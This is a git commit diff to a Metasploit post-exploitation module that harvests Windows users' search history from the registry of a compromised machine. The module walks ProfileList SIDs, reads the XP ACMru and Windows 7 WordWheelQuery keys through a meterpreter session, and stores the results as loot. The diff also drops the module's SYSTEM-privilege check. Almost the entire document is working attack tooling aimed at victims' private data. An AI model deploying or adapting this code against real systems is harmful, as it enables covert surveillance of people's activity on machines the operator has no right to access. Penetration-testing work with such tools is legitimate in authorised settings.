fd4eb6be267eec17b28929690565fc2abf8c4734
jiuweigui <fraktaali@gmail.com>
2013-07-22 23:17:08 +0300

    WinXP works, Win7 still unstable because of how registry is accessed.

--- enum_searches.rb
+++ enum_searches.rb
@@ -23,48 +23,74 @@ class Metasploit3 < Msf::Post
                      ))
   end
 
-  def find_users(table)
+  def find_users(table, sysnfo)
     # Function builds registry path and searches for USER_SIDs from it
     # and uses that information to find username using users home directory path.
     # This is not 100% accurate if the username has been changed however most of the time
     # it'll provide the correct username
 
     reg_path = "HKLM\\Software\\Microsoft\\Windows\ NT\\CurrentVersion\\ProfileList"
-    subkeys = registry_enumkeys(reg_path)
-    subkeys.each do |user_sid|
+    profile_subkeys = registry_enumkeys(reg_path)
+    profile_subkeys.each do |user_sid|
       if user_sid.length > 10 and not user_sid.nil?
         users = registry_getvaldata("HKLM\\Software\\Microsoft\\Windows\ NT\\CurrentVersion\\ProfileList\\#{user_sid}", "ProfileImagePath")
         upath = users.split("\\")
         username = "#{upath[-1]}"
         print_status("Search history of user: #{username}")
-        find_searches(user_sid, username, table)
+        find_searches(user_sid, username, table, sysnfo)
       end
     end
   end
 
-  def find_searches(user_sid, username, table)
+  def find_searches(user_sid, username, table, sysnfo)
     # Functions uses USER_SIDs to find searches users have made
     # and saves them to a table
 
-    hive = "HKU\\"
-    subkeys = "\\Software\\Microsoft\\Search\ Assistant\\ACMru"
-    full_registry_path = hive + user_sid + subkeys
-    search_subkeys = registry_enumkeys(full_registry_path)
-    if search_subkeys.nil?
-      print_error("User #{username}: Can't get search history. Maybe s/he isn't logged in.")
-    else
-      search_subkeys.each do |subkeys|
-        subkey = full_registry_path + "\\" + "#{subkeys}"
-        x = registry_enumvals(subkey)
-        if not subkey.nil?
-          x.each do |data|
-          regkey_search_data = registry_getvaldata(subkey, data)
-          search_history = regkey_search_data.to_s
-          table << [username,search_history]
+    if sysnfo =~/(Windows XP)/
+      hive = "HKU\\"
+      subkeys = "\\Software\\Microsoft\\Search\ Assistant\\ACMru"
+      full_registry_path = hive + user_sid + subkeys
+      search_subkeys = registry_enumkeys(full_registry_path)
+      if search_subkeys.nil?
+        print_error("User #{username}: Can't get search history. Maybe s/he isn't logged in.")
+      else
+        search_subkeys.each do |subkeys|
+          subkey = full_registry_path + "\\" + "#{subkeys}"
+          x = registry_enumvals(subkey)
+          if not subkey.nil?
+            x.each do |data|
+              regkey_search_data = registry_getvaldata(subkey, data)
+              search_history = regkey_search_data.to_s
+              table << [username,search_history]
           end
         end
       end
     end
+
+      # Not working stable ATM. Has something to do how the registry is accessed by metasploit.
+      # If HKU key is closed on its own you'll have to restart whole meterpreter session
+      # before you can get any results.
+
+    elsif sysnfo =~/(Windows 7)/
+      hive = "HKU\\"
+      subkeys = "\\Software\\Microsoft\\Windows\\CurrentVersion\\Explorer\\WordWheelQuery"
+      path = hive + user_sid + subkeys
+      x = registry_enumvals(path)
+      if x.nil?
+        print_error("Can't find any results. You'll have to restart the session.")
+        return nil
+      else
+        x.each do |data|
+          if data != "MRUListEx"
+             regkey_search_data = registry_getvaldata(path, data)
+             search_history = regkey_search_data.to_s.delete("\x00")
+             table << [username, search_history]
+          end
+        end
+      end
+    end
+
+
   end
 
   def run
@@ -90,13 +116,8 @@ class Metasploit3 < Msf::Post
     print_status("This will gather only searches from users currently logged on to the system.")
     print_status("Searches are presented from the most recent to the last per user.\n")
 
-    if not is_system?
-      print_error("Not enough privileges. Try getsystem.")
-      return nil
-    end
-
     # Function that runs everything else
-    find_users(table)
+    find_users(table, sysnfo)
     # Modifying, storing and presenting the results
     results = table.to_s.delete("\x00")
     loot = store_loot("user_searches", "text/plain", session, results, nil, "User Search Information")
